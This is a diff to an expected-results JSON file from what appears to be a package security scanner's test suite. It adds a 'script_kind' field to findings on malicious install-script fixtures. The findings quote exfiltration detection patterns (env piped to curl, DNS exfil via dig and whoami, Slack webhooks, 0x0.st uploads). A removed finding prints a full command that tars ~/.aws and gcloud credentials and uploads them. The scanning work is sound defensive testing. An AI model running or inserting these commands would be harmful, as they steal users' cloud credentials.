@@ -18,7 +18,8 @@
       "cwe_id": "CWE-494",
       "metadata": {
         "in_install_script": true,
-        "matched_text": "curl"
+        "matched_text": "curl",
+        "script_kind": "install script"
       }
     },
     {
@@ -37,7 +38,8 @@
       "cwe_id": "CWE-494",
       "metadata": {
         "in_install_script": true,
-        "matched_text": "curl"
+        "matched_text": "curl",
+        "script_kind": "install script"
       }
     },
     {
@@ -56,7 +58,8 @@
       "cwe_id": "CWE-200",
       "metadata": {
         "in_install_script": true,
-        "matched_text": "curl --data-binary "
+        "matched_text": "curl --data-binary ",
+        "script_kind": "install script"
       }
     },
     {
@@ -75,7 +78,8 @@
       "cwe_id": "CWE-200",
       "metadata": {
         "in_install_script": true,
-        "matched_text": "dig +short \"$(whoami).$("
+        "matched_text": "dig +short \"$(whoami).$(",
+        "script_kind": "install script"
       }
     },
     {
@@ -94,26 +98,8 @@
       "cwe_id": "CWE-200",
       "metadata": {
         "in_install_script": true,
-        "matched_text": "hooks.slack.com/services/"
-      }
-    },
-    {
-      "id": "HIDDEN-001",
-      "severity": "high",
-      "category": "malicious_code",
-      "title": "Hidden file creation in home (install script)",
-      "description": "Creating hidden files in user home directory",
-      "location": {
-        "file": "tests/fixtures/malicious/exfil-channels/stats-collector.install",
-        "line": 4,
-        "column": 13,
-        "snippet": "  tar czf - ~/.aws ~/.config/gcloud | curl --upload-file - https://0x0.st"
-      },
-      "recommendation": "Packages should not create hidden files in user home",
-      "cwe_id": null,
-      "metadata": {
-        "in_install_script": true,
-        "matched_text": "~/.aws ~"
+        "matched_text": "hooks.slack.com/services/",
+        "script_kind": "install script"
       }
     },
     {
@@ -132,7 +118,8 @@
       "cwe_id": "CWE-200",
       "metadata": {
         "in_install_script": true,
-        "matched_text": "curl --upload-file"
+        "matched_text": "curl --upload-file",
+        "script_kind": "install script"
       }
     },
     {
@@ -151,7 +138,8 @@
       "cwe_id": "CWE-200",
       "metadata": {
         "in_install_script": true,
-        "matched_text": "0x0.st"
+        "matched_text": "0x0.st",
+        "script_kind": "install script"
       }
     },
     {
@@ -170,7 +158,8 @@
       "cwe_id": "CWE-522",
       "metadata": {
         "in_install_script": true,
-        "matched_text": "env | curl"
+        "matched_text": "env | curl",
+        "script_kind": "install script"
       }
     },
     {
@@ -189,7 +178,8 @@
       "cwe_id": "CWE-522",
       "metadata": {
         "in_install_script": true,
-        "matched_text": ".config/gcloud"
+        "matched_text": ".config/gcloud",
+        "script_kind": "install script"
       }
     }
   ],
@@ -197,6 +187,6 @@
     "tests/fixtures/malicious/exfil-channels/PKGBUILD",
     "tests/fixtures/malicious/exfil-channels/stats-collector.install"
   ],
-  "timestamp": "2026-06-15T13:48:49.562734978Z",
-  "scan_duration_ms": 6
+  "timestamp": "2026-11-10T14:50:58.069000680Z",
+  "scan_duration_ms": 23
 }
